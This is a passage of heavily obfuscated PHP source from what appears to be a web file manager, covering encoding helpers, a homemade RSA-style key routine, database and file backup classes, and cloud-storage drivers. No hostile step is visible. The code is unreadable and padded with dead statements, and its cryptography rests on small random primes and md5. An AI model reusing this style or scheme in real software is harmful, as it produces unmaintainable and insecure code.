$»Ë¦¬Ò[702]; if (strlen($–ëÈÀ¹º) < $»Ë¦¬Ò[608]) { die; } switch ($½¥¦±“ı) { case $º›êËãà[197]: $‘ïı¥‡ó = $this->ilzt267898f8($«½ÙÌÃ, strrev($ã÷ôÅÁ¾ . $¾›ò¡ù )); $‚–ÔæÎ = $»Ë¦¬Ò[703]; if (strlen($‚–ÔæÎ) < $»Ë¦¬Ò[605]) { return; } break; $€ì¤Çª = $»Ë¦¬Ò[704]; if (!$€ì¤Çª) { return; } case $º›êËãà[189]: $‘ïı¥‡ó = $this->ilzt267898f8($«½ÙÌÃ, strrev($¾›ò¡ù  . $ã÷ôÅÁ¾)); break; case $º›êËãà[291]: $‘ïı¥‡ó = $this->ilzt267898f8($«½ÙÌÃ, base64_encode($¾›ò¡ù  . $ã÷ôÅÁ¾)); $ö÷•°Ä’ = $»Ë¦¬Ò[705]; if (strlen($ö÷•°Ä’) < $»Ë¦¬Ò[626]) { return; } break; case $º›êËãà[292]: $‘ïı¥‡ó = $this->ilzt267898f8($«½ÙÌÃ, md5($¾›ò¡ù  . $ã÷ôÅÁ¾)); break; $È¬ñöÔÌ = $»Ë¦¬Ò[706]; case $º›êËãà[293]: $«½ÙÌÃ = hash_decode($«½ÙÌÃ); $´Ø‡¬©… = $«½ÙÌÃ[0]; $«½ÙÌÃ = substr($«½ÙÌÃ, 1); $ıÉ¬‹õ¥ = strpos($´üÄ½§, $´Ø‡¬©…); $Ç–ÊŞğ = $»Ë¦¬Ò[707]; while (strlen($Ç–ÊŞğ) < $»Ë¦¬Ò[605]) { if (!$Ç–ÊŞğ) { break; } $Ç–ÊŞğ++; } $Ü¸Ö‹Œë = md5($´Ø‡¬©… . md5($ã÷ôÅÁ¾ . $´Ø‡¬©…) . $ã÷ôÅÁ¾); $Ü¸Ö‹Œë = substr($Ü¸Ö‹Œë, $ıÉ¬‹õ¥ % 8, $ıÉ¬‹õ¥ % 8 + 7); $ò¤ŒÆóà = $»Ë¦¬Ò[708]; if (strlen($ò¤ŒÆóà) < $»Ë¦¬Ò[644]) { return; } $û¡”Š” = $º›êËãà[6]; $ÍÍ£Òæï = $»Ë¦¬Ò[709]; if (!$ÍÍ£Òæï) { die; } $ÁÜŸ¤ = 0; $¬ÄÈ¨ó– = $»Ë¦¬Ò[710]; $²Œ›ÌêÌ = 0; $ı„ãö„ë = $»Ë¦¬Ò[711]; while ($ı„ãö„ë < $»Ë¦¬Ò[644]) { if ($ı„ãö„ë >= 0) { break; } $ı„ãö„ë++; } $ïõµŠ«Í = 0; for ($ÁÜŸ¤ = 0; $ÁÜŸ¤ < strlen($«½ÙÌÃ); $ÁÜŸ¤++) { $ïõµŠ«Í = $ïõµŠ«Í == strlen($Ü¸Ö‹Œë) ? 0 : $ïõµŠ«Í; $ˆ¤Í “æ = $»Ë¦¬Ò[712]; while ($ˆ¤Í “æ < $»Ë¦¬Ò[628]) { if ($ˆ¤Í “æ >= 0) { break; } $ˆ¤Í “æ++; } $Ëä«İœÃ = $ïõµŠ«Í++; $Îı¤ì‰ = $»Ë¦¬Ò[713]; if (strlen($Îı¤ì‰) < $»Ë¦¬Ò[644]) { die; } $²Œ›ÌêÌ = strpos($´üÄ½§, $«½ÙÌÃ[$ÁÜŸ¤]) - $ıÉ¬‹õ¥ - ord($Ü¸Ö‹Œë[$Ëä«İœÃ]); $û÷¸É— = $»Ë¦¬Ò[714]; if (!$û÷¸É—) { return; } while ($²Œ›ÌêÌ < 0) { $²Œ›ÌêÌ += 64; $ç¨É¼“Ì = $»Ë¦¬Ò[715]; } $û¡”Š” .= $´üÄ½§[$²Œ›ÌêÌ]; $ş¢İêÌß = $»Ë¦¬Ò[716]; if (!$ş¢İêÌß) { return; } } $‘ïı¥‡ó = base64_decode($û¡”Š”); break; default: $‘ïı¥‡ó = $this->ilzt267898f8($«½ÙÌÃ, $ã÷ôÅÁ¾ . $¾›ò¡ù ); $éÓ˜¿£ñ = $»Ë¦¬Ò[717]; if (!$éÓ˜¿£ñ) { return; } break; } if ($›êÃœáÓ - 1 > 0) { $‘ïı¥‡ó = $this->lfnw320a3134($‘ïı¥‡ó, $ã÷ôÅÁ¾, $›êÃœáÓ - 1); } return $‘ïı¥‡ó; } public function tiok76aa9b84($¿øÕÌ) { $›ğ¸¿™ =& $_SERVER[ÏÒ Ì„]; $ş‡©‚Ê² =& $_SERVER[º‚ØÇıÁ]; $ÔÄ¦Èò¶ = $this->gmlx6d884e05(); $ï¶ÄâäÜ = $›ğ¸¿™[696]; if (!$ï¶ÄâäÜ) { return; } $±“äƒäõ = $this->gmlx6d884e05(); $àÎÁù = $›ğ¸¿™[718]; $“µíşÉ‘ = ($ÔÄ¦Èò¶ - 1) * ($±“äƒäõ - 1); $ƒÙØÅ‡ë = $›ğ¸¿™[719]; $ À™Õì» = intval(($ÔÄ¦Èò¶ + $±“äƒäõ) / 2); while (1) { $İê¡Êüİ = $ À™Õì»; $íòìğ“Ú = $›ğ¸¿™[720]; $öôÏ¼ô = $“µíşÉ‘; while ($öôÏ¼ô % $İê¡Êüİ != 0) { $ÍÂáƒıè = $öôÏ¼ô; $öôÏ¼ô = $İê¡Êüİ; $œ•²– = $›ğ¸¿™[721]; if (strlen($œ•²–) < $›ğ¸¿™[628]) { return; } $İê¡Êüİ = $ÍÂáƒıè % $İê¡Êüİ; } if ($İê¡Êüİ == 1) { break; } else { $ À™Õì»++; } } $”ÂîØ£ş = 2; $ÎÌß¨Ã = $›ğ¸¿™[722]; for ($®áëìÛÉ = 0; $®áëìÛÉ < $“µíşÉ‘ * 10; $®áëìÛÉ++) { if (($“µíşÉ‘ * $®áëìÛÉ + 1) % $ À™Õì» == 0) { $”ÂîØ£ş = intval(($“µíşÉ‘ * $®áëìÛÉ + 1) / $ À™Õì»); break; } } $ëÖ´‰¸ˆ = $this->xqyodcd9fac2($ÔÄ¦Èò¶ * $±“äƒäõ . $ş‡©‚Ê²[6], $ş‡©‚Ê²[128]); $¹¨½šÒ® = $›ğ¸¿™[723]; if (strlen($¹¨½šÒ®) < $›ğ¸¿™[605]) { die; } $¥Œó²× = md5($ş‡©‚Ê²[294] . ($ÔÄ¦Èò¶ + $±“äƒäõ) . $ş‡©‚Ê²[295] . $ À™Õì» . $ş‡©‚Ê²[295] . $”ÂîØ£ş . $ş‡©‚Ê²[296]); $…—ÛìÍ = $this->xqyodcd9fac2($¿øÕÌ, $¥Œó²×) . $ş‡©‚Ê²[297] . $ëÖ´‰¸ˆ; return $…—ÛìÍ; } public function udlyb2fc32eb($è¨œïõñ) { $—Ñˆİªœ =& $_SERVER[ÏÒ Ì„]; $£öİÆõÛ =& $_SERVER[º‚ØÇıÁ]; $ºï¿ÊíŸ = explode($£öİÆõÛ[297], $è¨œïõñ); if (count($ºï¿ÊíŸ) != 2) { return $£öİÆõÛ[6]; } $ìÈ³úˆÑ = $this->ilzt267898f8($ºï¿ÊíŸ[1] . $£öİÆõÛ[6], $£öİÆõÛ[128]); if (!$ìÈ³úˆÑ) { return $£öİÆõÛ[6]; } $ìÈ³úˆÑ = intval($ìÈ³úˆÑ); $êÕßÌÈÒ = 0; $¤ª•¸ï” = $—Ñˆİªœ[724]; if (strlen($¤ª•¸ï”) < $—Ñˆİªœ[605]) { return; } $àË‚Ğşƒ = 0; for ($•ØÑ½ƒ = 3; $•ØÑ½ƒ < $ìÈ³úˆÑ; $•ØÑ½ƒ += 2) { if ($ìÈ³úˆÑ % $•ØÑ½ƒ != 0) { continue; } $êÕßÌÈÒ = $•ØÑ½ƒ; $àË‚Ğşƒ = intval($ìÈ³úˆÑ / $•ØÑ½ƒ); $ÂïØöá = $—Ñˆİªœ[725]; if (strlen($ÂïØöá) < $—Ñˆİªœ[644]) { die; } break; $ªÖ¾÷¶ = $—Ñˆİªœ[726]; } $ï¢ó•Á = ($êÕßÌÈÒ - 1) * ($àË‚Ğşƒ - 1); $Û¤°Ë«© = $—Ñˆİªœ[727]; if (strlen($Û¤°Ë«©) < $—Ñˆİªœ[608]) { die; } $Ô€øÈÚ§ = intval(($êÕßÌÈÒ + $àË‚Ğşƒ) / 2); $¤ßñ—·â = $—Ñˆİªœ[728]; if (!$¤ßñ—·â) { return; } while (1) { $ôºÅã«  = $Ô€øÈÚ§; $âÑê¥Âñ = $ï¢ó•Á; while ($âÑê¥Âñ % $ôºÅã«  != 0) { $¿ëÌ»İé = $âÑê¥Âñ; $Ë‘ï©å = $—Ñˆİªœ[729]; $âÑê¥Âñ = $ôºÅã« ; $ø¢Â«¥¿ = $—Ñˆİªœ[730]; if (!$ø¢Â«¥¿) { die; } $ôºÅã«  = $¿ëÌ»İé % $ôºÅã« ; $‘Ãö­ = $—Ñˆİªœ[731]; if (strlen($‘Ãö­) < $—Ñˆİªœ[628]) { return; } } if ($ôºÅã«  == 1) { break; } else { $Ô€øÈÚ§++; } } $¡¦ââ¥ß = 2; for ($•ØÑ½ƒ = 0; $•ØÑ½ƒ < $ï¢ó•Á * 10; $•ØÑ½ƒ++) { if (($ï¢ó•Á * $•ØÑ½ƒ + 1) % $Ô€øÈÚ§ == 0) { $¡¦ââ¥ß = intval(($ï¢ó•Á * $•ØÑ½ƒ + 1) / $Ô€øÈÚ§); break; } } $Â¯ëÔæ® = md5($£öİÆõÛ[294] . ($êÕßÌÈÒ + $àË‚Ğşƒ) . $£öİÆõÛ[295] . $Ô€øÈÚ§ . $£öİÆõÛ[295] . $¡¦ââ¥ß . $£öİÆõÛ[296]); $Â±âÁÛÙ = $—Ñˆİªœ[732]; while (strlen($Â±âÁÛÙ) < $—Ñˆİªœ[605]) { if (!$Â±âÁÛÙ) { break; } $Â±âÁÛÙ++; } $Ê€ØàÂ¦ = $this->ilzt267898f8($ºï¿ÊíŸ[0], $Â¯ëÔæ®); return $Ê€ØàÂ¦; $ƒÁÓ¯†ì = $—Ñˆİªœ[733]; if (!$ƒÁÓ¯†ì) { return; } } public function gmlx6d884e05() { $Ì«ÍÕŸ« =& $_SERVER[ÏÒ Ì„]; $‚ú–¼Ê = mt_rand(pow(2, 14), pow(2, 16) - 1); $óÌ×­ùÑ = $Ì«ÍÕŸ«[734]; while ($óÌ×­ùÑ < $Ì«ÍÕŸ«[628]) { if ($óÌ×­ùÑ >= 0) { break; } $óÌ×­ùÑ++; } $êš«ÅÉ = array(); $Ö€Øİüç = 1; $µ©ı¼Ğä = $Ì«ÍÕŸ«[735]; while ($Ö€Øİüç <= (int) sqrt($‚ú–¼Ê)) { $šÓËÒĞ = $Ö€Øİüç; while (!0) { $šÓËÒĞ++; if ($šÓËÒĞ <= 2) { $Ö€Øİüç = $šÓËÒĞ; break; } else { if ($šÓËÒĞ < 2) { continue; } } $¾©»áş§ = !0; for ($˜É½÷— = 2; $˜É½÷— <= sqrt($šÓËÒĞ); $˜É½÷—++) { if ($šÓËÒĞ % $˜É½÷— == 0) { $¾©»áş§ = !1; } } if ($¾©»áş§) { $Ö€Øİüç = $šÓËÒĞ; break; } } $êš«ÅÉ[] = $Ö€Øİüç; $ß·¤ìºË = $Ì«ÍÕŸ«[736]; } $½¹Ø³› = 2; for ($šÓËÒĞ = $‚ú–¼Ê; $šÓËÒĞ > 1; $šÓËÒĞ--) { $¾©»áş§ = !0; foreach ($êš«ÅÉ as $é¾ŠÚø¥) { if ($šÓËÒĞ % $é¾ŠÚø¥ == 0) { $¾©»áş§ = !1; break; } } if ($¾©»áş§) { $½¹Ø³› = $šÓËÒĞ; break; } } return $½¹Ø³›; $‚­®–™‰ = $Ì«ÍÕŸ«[737]; while ($‚­®–™‰ < $Ì«ÍÕŸ«[626]) { if ($‚­®–™‰ >= 0) { break; } $‚­®–™‰++; } } public function ohlz930479af($Î·Ïéğ, $ç‹îæ—¡) { $¸‘“ÊäÜ =& $_SERVER[º‚ØÇıÁ]; return call_user_func(array($¸‘“ÊäÜ[8], $¸‘“ÊäÜ[298]), $Î·Ïéğ, $ç‹îæ—¡); } public function xqyodcd9fac2($Ã”Áœ¿, $ƒñ½Ï §) { $ÂŒ‚€¶ =& $_SERVER[º‚ØÇıÁ]; return call_user_func(array($ÂŒ‚€¶[299], $ÂŒ‚€¶[300]), $Ã”Áœ¿, $ƒñ½Ï §); } public function ilzt267898f8($Õğ£, $Â±ƒŞ«î) { $„ªñ¥ñº =& $_SERVER[º‚ØÇıÁ]; return call_user_func(array($„ªñ¥ñº[299], $„ªñ¥ñº[301]), $Õğ£, $Â±ƒŞ«î); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $”«™Ïàñ =& $_SERVER[ÏÒ Ì„]; $this->isManual(); self::$name = date($”«™Ïàñ[738]); if (!($º©“ÜÖ· = Model($”«™Ïàñ[739])->lastItem())) { $º©“ÜÖ· = $this->initData(); } else { self::$name = $º©“ÜÖ·[$”«™Ïàñ[28]]; if ($º©“ÜÖ·[$”«™Ïàñ[740]] == $”«™Ïàñ[87]) { self::$name = date($”«™Ïàñ[741]); $Ø¡†¦´ = 0; if (isset($º©“ÜÖ·[$”«™Ïàñ[291]][$”«™Ïàñ[193]][$”«™Ïàñ[461]])) { $Ø¡†¦´ = (int) $º©“ÜÖ·[$”«™Ïàñ[291]][$”«™Ïàñ[193]][$”«™Ïàñ[461]]; } if (self::$manual == 0 && $º©“ÜÖ·[$”«™Ïàñ[28]] == self::$name) { Model($”«™Ïàñ[739])->remove($º©“ÜÖ·[$”«™Ïàñ[395]]); } $º©“ÜÖ· = $this->initData($Ø¡†¦´, $º©“ÜÖ·[$”«™Ïàñ[742]]); } else { $this->checkStore($º©“ÜÖ·[$”«™Ïàñ[742]]); } } self::$option = $º©“ÜÖ·; } private function isManual() { $îÌµºÈ = _get($GLOBALS, $_SERVER[ÏÒ Ì„][743], 0); $îÌµºÈ = intval($îÌµºÈ); self::$manual = $îÌµºÈ && $îÌµºÈ == 1 ? 1 : 0; } private function initData($ñ’üÊ¦æ = 0, $†ıû†ĞÂ = '') { $ñ«ö§Í« =& $_SERVER[ÏÒ Ì„]; $ëÇ¶Â¾ = Model($ñ«ö§Í«[739])->config(); if ($†ıû†ĞÂ && $ëÇ¶Â¾[$ñ«ö§Í«[742]] != $†ıû†ĞÂ) { $ñ’üÊ¦æ = 0; } $this->checkStore($ëÇ¶Â¾[$ñ«ö§Í«[742]]); if (self::$manual == 1) { self::$name .= $ñ«ö§Í«[71] . date($ñ«ö§Í«[744]); } $¨…Ìõ—¾ = array($ñ«ö§Í«[742] => $ëÇ¶Â¾[$ñ«ö§Í«[742]], $ñ«ö§Í«[28] => self::$name, $ñ«ö§Í«[740] => 0, $ñ«ö§Í«[745] => $ëÇ¶Â¾[$ñ«ö§Í«[745]], $ñ«ö§Í«[746] => self::$manual, $ñ«ö§Í«[291] => array($ñ«ö§Í«[747] => array($ñ«ö§Í«[740] => 0), $ñ«ö§Í«[748] => array($ñ«ö§Í«[740] => 0, $ñ«ö§Í«[749] => 0, $ñ«ö§Í«[750] => 0, $ñ«ö§Í«[29] => $ñ«ö§Í«[33], $ñ«ö§Í«[751] => 0, $ñ«ö§Í«[490] => 0), $ñ«ö§Í«[752] => array($ñ«ö§Í«[740] => 0, $ñ«ö§Í«[749] => 0, $ñ«ö§Í«[750] => 0, $ñ«ö§Í«[751] => 0, $ñ«ö§Í«[490] => 0), $ñ«ö§Í«[193] => array($ñ«ö§Í«[740] => 0, $ñ«ö§Í«[753] => 0, $ñ«ö§Í«[754] => 0, $ñ«ö§Í«[755] => 0, $ñ«ö§Í«[756] => 0, $ñ«ö§Í«[461] => $ñ’üÊ¦æ, $ñ«ö§Í«[751] => 0, $ñ«ö§Í«[490] => 0)), $ñ«ö§Í«[751] => time(), $ñ«ö§Í«[490] => 0); $ñÆÍˆÄ = Model($ñ«ö§Í«[739])->insert($¨…Ìõ—¾); $¨…Ìõ—¾[$ñ«ö§Í«[395]] = $ñÆÍˆÄ; return $¨…Ìõ—¾; } private function checkStore($Å‘„œ‰‚) { $©ıâ¨õ‚ =& $_SERVER[ÏÒ Ì„]; $¦À«§ËÏ = Model($©ıâ¨õ‚[757])->listData($Å‘„œ‰‚); Model($©ıâ¨õ‚[757])->checkConfig($¦À«§ËÏ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ÏÒ Ì„][739])->findByName(self::$name); } return self::$option; } public static function set($¢©±‰ü) { $®øĞÄ×ö =& $_SERVER[ÏÒ Ì„]; $Úî×®‹± = self::get(); foreach ($¢©±‰ü as $¤ÊÏ’ => $ñ¶§œÕç) { $ÈçÃ¹Ò = explode($®øĞÄ×ö[95], $¤ÊÏ’); $Å¥ş€µ÷ = count($ÈçÃ¹Ò); switch ($Å¥ş€µ÷) { case 1: $Úî×®‹±[$ÈçÃ¹Ò[0]] = $ñ¶§œÕç; break; case 2: $Úî×®‹±[$ÈçÃ¹Ò[0]][$ÈçÃ¹Ò[1]] = $ñ¶§œÕç; break; case 3: $Úî×®‹±[$ÈçÃ¹Ò[0]][$ÈçÃ¹Ò[1]][$ÈçÃ¹Ò[2]] = $ñ¶§œÕç; break; } } Model($®øĞÄ×ö[739])->update($Úî×®‹±[$®øĞÄ×ö[395]], $Úî×®‹±); self::$option = $Úî×®‹±; return self::$option; } public function keep() { $Ïğ¬ƒÅ… =& $_SERVER[ÏÒ Ì„]; $¤ª ë‰ = self::get(); if ($¤ª ë‰[$Ïğ¬ƒÅ…[291]][$Ïğ¬ƒÅ…[747]][$Ïğ¬ƒÅ…[740]] == $Ïğ¬ƒÅ…[87]) { return; } $this->backupKeep($¤ª ë‰); self::set(array($Ïğ¬ƒÅ…[758] => 1)); } private function backupKeep($ğßŸšù”) { $¤¦º¬È¯ =& $_SERVER[ÏÒ Ì„]; if (self::$manual == 1) { return; } $¥şğôÌ  = Model($¤¦º¬È¯[739])->listData(); if (empty($¥şğôÌ )) { return; } $İÌ ¨ = 0; $ßâİ„Àë = array(); foreach ($¥şğôÌ  as $¸Ù¦÷…) { if ($İÌ ¨ >= 7) { break; } $ßâİ„Àë[] = $¸Ù¦÷…[$¤¦º¬È¯[28]]; $İÌ ¨++; } for ($İÌ ¨ = 0; $İÌ ¨ < 12; $İÌ ¨++) { $ßâİ„Àë[] = date($¤¦º¬È¯[759], strtotime("\x2d{$İÌ ¨}\40\x6d\157\x6e\x74\x68\163")); } $ßâİ„Àë = array_unique($ßâİ„Àë); $çÜõâ›Î = Model($¤¦º¬È¯[760])->get($¤¦º¬È¯[761]); foreach ($¥şğôÌ  as $¸Ù¦÷…) { if (isset($¸Ù¦÷…[$¤¦º¬È¯[746]]) && $¸Ù¦÷…[$¤¦º¬È¯[746]] == $¤¦º¬È¯[87]) { continue; } if (!empty($¸Ù¦÷…[$¤¦º¬È¯[28]]) && in_array($¸Ù¦÷…[$¤¦º¬È¯[28]], $ßâİ„Àë)) { continue; } Model($¤¦º¬È¯[739])->remove($¸Ù¦÷…[$¤¦º¬È¯[395]]); $ôÖ’²úà = $this->backupPath($ğßŸšù”, $çÜõâ›Î); IO::remove($ôÖ’²úà, !1); } } private function backupPath($Ãó™ÕçÖ, $¡Ùƒ®ÈÅ = false) { $ÚµÇèß =& $_SERVER[ÏÒ Ì„]; if (!$¡Ùƒ®ÈÅ) { $¡Ùƒ®ÈÅ = Model($ÚµÇèß[760])->get($ÚµÇèß[761]); } $™¾³”æ÷ = $Ãó™ÕçÖ[$ÚµÇèß[28]]; $‹Áµ…Ö = substr(md5($ÚµÇèß[762] . $¡Ùƒ®ÈÅ . $™¾³”æ÷), 0, 8); return "\x7b\151\x6f\x3a{$Ãó™ÕçÖ[$ÚµÇèß[742]]}\175\x2f\144\x61\164\141\142\x61\163\145\57\x62\x61\x63\x6b\165\160\x2f" . $™¾³”æ÷ . $ÚµÇèß[71] . $‹Áµ…Ö; } public function db() { $íèÚîúÑ =& $_SERVER[ÏÒ Ì„]; $ïó€®¦ˆ = self::get(); if ($ïó€®¦ˆ[$íèÚîúÑ[291]][$íèÚîúÑ[748]][$íèÚîúÑ[740]] == $íèÚîúÑ[87]) { return !0; } $Ù»–§È = new BackupDb(); if (!$Ù»–§È->index()) { return !1; } self::set(array($íèÚîúÑ[763] => 1)); return !0; } public function dbFile() { $³ ôé•³ =& $_SERVER[ÏÒ Ì„]; $…Ìç•ÒÚ = self::get(); if ($…Ìç•ÒÚ[$³ ôé•³[291]][$³ ôé•³[752]][$³ ôé•³[740]] == $³ ôé•³[87]) { return !0; } $¾Çç½òı = new BackupDbFile(); if (!$¾Çç½òı->index()) { return !1; } self::set(array($³ ôé•³[764] => 1)); return !0; } public function file() { $ƒØ­Äß =& $_SERVER[ÏÒ Ì„]; $Á² î±ö = self::get(); if ($Á² î±ö[$ƒØ­Äß[291]][$ƒØ­Äß[193]][$ƒØ­Äß[740]] == $ƒØ­Äß[87]) { return !0; } if (!isset($Á² î±ö[$ƒØ­Äß[745]]) || $Á² î±ö[$ƒØ­Äß[745]] == $ƒØ­Äß[191]) { $ò„¼ÒâÈ = new BackupFile(); if (!$ò„¼ÒâÈ->index()) { return !1; } } self::set(array($ƒØ­Äß[765] => 1, $ƒØ­Äß[740] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ ÜÊ¿‰À =& $_SERVER[ÏÒ Ì„]; $“Éœæâ§ = Backup::get(); self::$io = $“Éœæâ§[$ ÜÊ¿‰À[742]]; self::$name = $“Éœæâ§[$ ÜÊ¿‰À[28]]; $ä˜úÌ‘½ = $GLOBALS[$ ÜÊ¿‰À[6]][$ ÜÊ¿‰À[17]]; $°ÓÃâ‰Û = $this->_dbType($ä˜úÌ‘½); $´¹øôîİ = new DbManage($ä˜úÌ‘½, $°ÓÃâ‰Û); $òÃ·‡«Î = array($ ÜÊ¿‰À[766] => $°ÓÃâ‰Û, $ ÜÊ¿‰À[767] => time()); Backup::set($òÃ·‡«Î); $Í¹°üĞ¤ = $this->tmpFilesPath() . $ ÜÊ¿‰À[768] . self::$name . $ ÜÊ¿‰À[8]; del_dir($Í¹°üĞ¤); mk_dir($Í¹°üĞ¤); $æş£İ†ç = $Ïò² = 0; try { $çÌÚß²ş = $´¹øôîİ->db()->getTables(); } catch (Exception $ü£½Éş†) { return !1; } $çÌÚß²ş = array_diff($çÌÚß²ş, array($ ÜÊ¿‰À[769], $ ÜÊ¿‰À[770])); foreach ($çÌÚß²ş as $˜àŸà‰Ï) { $æş£İ†ç += $´¹øôîİ->model($˜àŸà‰Ï)->count(); } $¨‰ÕÉÃÔ = new Task($ ÜÊ¿‰À[771], $ ÜÊ¿‰À[772], $æş£İ†ç, LNG($ ÜÊ¿‰À[773]) . $ ÜÊ¿‰À[774] . LNG($ ÜÊ¿‰À[775])); foreach ($çÌÚß²ş as $˜àŸà‰Ï) { $ã´¨ü = $Í¹°üĞ¤ . $˜àŸà‰Ï . $ ÜÊ¿‰À[776]; $Äè¡£ìŒ = null; if ($˜àŸà‰Ï == $ ÜÊ¿‰À[777] && (!isset($“Éœæâ§[$ ÜÊ¿‰À[745]]) || $“Éœæâ§[$ ÜÊ¿‰À[745]] == $ ÜÊ¿‰À[191])) { $Äè¡£ìŒ = self::$io; } $Ïò² += $´¹øôîİ->sqlFromDb($˜àŸà‰Ï, $ã´¨ü, $¨‰ÕÉÃÔ, $Äè¡£ìŒ); } if (isset($¨‰ÕÉÃÔ->task[$ ÜÊ¿‰À[778]])) { $¸¤¹Ùº´ = $¨‰ÕÉÃÔ->task[$ ÜÊ¿‰À[778]] ? $¨‰ÕÉÃÔ->task[$ ÜÊ¿‰À[778]] : timeFloat(); $È„Ó—Ö» = $¸¤¹Ùº´ - $¨‰ÕÉÃÔ->task[$ ÜÊ¿‰À[779]]; if ($È„Ó—Ö» >= 0.2) { $æş£İ†ç += 1; } } $¨‰ÕÉÃÔ->end(); $òÃ·‡«Î = array($ ÜÊ¿‰À[766] => $°ÓÃâ‰Û, $ ÜÊ¿‰À[763] => 1, $ ÜÊ¿‰À[780] => $æş£İ†ç, $ ÜÊ¿‰À[781] => $Ïò², $ ÜÊ¿‰À[782] => time()); Backup::set($òÃ·‡«Î); if ($æş£İ†ç - $Ïò² > 1) { $³–ğ†À¿ = $ ÜÊ¿‰À[783]; if (stristr(I18n::getType(), $ ÜÊ¿‰À[784])) { $³–ğ†À¿ = $ ÜÊ¿‰À[785]; } write_log(array($³–ğ†À¿, $òÃ·‡«Î), $ ÜÊ¿‰À[772]); return !1; } return !0; } private function _dbType($¿˜ƒìºÍ) { $¡ßˆ›¬È =& $_SERVER[ÏÒ Ì„]; $¿˜ƒìºÍ = array_change_key_case($¿˜ƒìºÍ); $¶˜óìÛÕ = $¿˜ƒìºÍ[$¡ßˆ›¬È[786]]; if ($¶˜óìÛÕ == $¡ßˆ›¬È[787]) { $ÍŞ²ùúŠ = explode($¡ßˆ›¬È[4], $¿˜ƒìºÍ[$¡ßˆ›¬È[788]]); $¶˜óìÛÕ = $ÍŞ²ùúŠ[0]; } $¯ë¥ÒÖ« = array($¡ßˆ›¬È[789] => $¡ßˆ›¬È[9], $¡ßˆ›¬È[790] => $¡ßˆ›¬È[791]); if (isset($¯ë¥ÒÖ«[$¶˜óìÛÕ])) { $¶˜óìÛÕ = $¯ë¥ÒÖ«[$¶˜óìÛÕ]; } return $¶˜óìÛÕ; } private function tmpFilesPath() { $üú÷Ø©¯ =& $_SERVER[ÏÒ Ì„]; $²£‹Ï‡¿ = TEMP_FILES; if ($GLOBALS[$üú÷Ø©¯[6]][$üú÷Ø©¯[88]][$üú÷Ø©¯[792]]) { $²£‹Ï‡¿ = $GLOBALS[$üú÷Ø©¯[6]][$üú÷Ø©¯[88]][$üú÷Ø©¯[792]]; if (!mk_dir($²£‹Ï‡¿) || !is_writable($²£‹Ï‡¿) || !IO::mkfile($²£‹Ï‡¿ . $üú÷Ø©¯[793])) { $²£‹Ï‡¿ = TEMP_FILES; } } return $²£‹Ï‡¿; } } goto C›ôåÜ®Äß; EÉ›Ó«–: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($—™½²Ñ) { parent::__construct($—™½²Ñ); $this->signatureVersion($_SERVER[ÏÒ Ì„][212]); } public function fileOutLink($ªŸú¥ ˜) { $…ıË˜‚‹ =& $_SERVER[ÏÒ Ì„]; if (substr($ªŸú¥ ˜, 0, 7) == $…ıË˜‚‹[1249]) { $ªŸú¥ ˜ = $…ıË˜‚‹[1250] . substr($ªŸú¥ ˜, 7); } header($…ıË˜‚‹[159] . $ªŸú¥ ˜); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ç¡Üğ„Ò) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÏÒ Ì„][1308]; $this->_init($ç¡Üğ„Ò); } public function _init($›™—ú±) { $«¿ã¬å¾ =& $_SERVER[ÏÒ Ì„]; foreach ($›™—ú± as $çÌ¾í£ş => $Ş˜Ç¶ÄŸ) { if (isset($this->{$çÌ¾í£ş})) { $this->{$çÌ¾í£ş} = $Ş˜Ç¶ÄŸ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($«¿ã¬å¾[1309] . LNG($«¿ã¬å¾[1310])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÖÙĞì»Ñ =& $_SERVER[ÏÒ Ì„]; $‰´ó÷™ = new OSS\Model\CorsConfig(); $Éüœå» = new OSS\Model\CorsRule(); $Éüœå»->addAllowedOrigin($ÖÙĞì»Ñ[1311]); $Éüœå»->addAllowedMethod($ÖÙĞì»Ñ[1312]); $Éüœå»->addAllowedMethod($ÖÙĞì»Ñ[1313]); $Éüœå»->addAllowedMethod($ÖÙĞì»Ñ[1314]); $Éüœå»->addAllowedMethod($ÖÙĞì»Ñ[1315]); $Éüœå»->addAllowedMethod($ÖÙĞì»Ñ[158]); $Éüœå»->setMaxAgeSeconds(600); $Éüœå»->addExposeHeader($ÖÙĞì»Ñ[1316]); $Éüœå»->addAllowedHeader($ÖÙĞì»Ñ[1311]); $‰´ó÷™->addRule($Éüœå»); try { $this->client->putBucketCors($this->bucket, $‰´ó÷™); } catch (OSS\Core\OssException $‡€õ‘¢”) { return !1; } return !0; } public function getBucketCors() { $ ºñ¬¹ğ =& $_SERVER[ÏÒ Ì„]; $Ù÷ÂìÈ° = null; try { $Ù÷ÂìÈ° = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ß¯¯±å“) { return null; } if (!$Ù÷ÂìÈ° || !($¤ÔÈ¢Ú« = $Ù÷ÂìÈ°->getRules())) { return null; } $—öÇú—¹ = $¤ÔÈ¢Ú«[0]->getAllowedOrigins(); $¢Î‡ñÅï = $¤ÔÈ¢Ú«[0]->getAllowedMethods(); $‡ú¦±ÄÕ = $¤ÔÈ¢Ú«[0]->getMaxAgeSeconds(); $…Á­Ú÷â = $¤ÔÈ¢Ú«[0]->getExposeHeaders(); $ÚÕÏÍğ = $¤ÔÈ¢Ú«[0]->getAllowedHeaders(); return array($ ºñ¬¹ğ[181] => isset($—öÇú—¹[0]) ? $—öÇú—¹[0] : $ ºñ¬¹ğ[33], $ ºñ¬¹ğ[185] => $¢Î‡ñÅï, $ ºñ¬¹ğ[1317] => $‡ú¦±ÄÕ, $ ºñ¬¹ğ[1318] => isset($…Á­Ú÷â[0]) ? $…Á­Ú÷â[0] : $ ºñ¬¹ğ[33], $ ºñ¬¹ğ[183] => isset($ÚÕÏÍğ[0]) ? $ÚÕÏÍğ[0] : $ ºñ¬¹ğ[33]); } public function isBucketCors() { 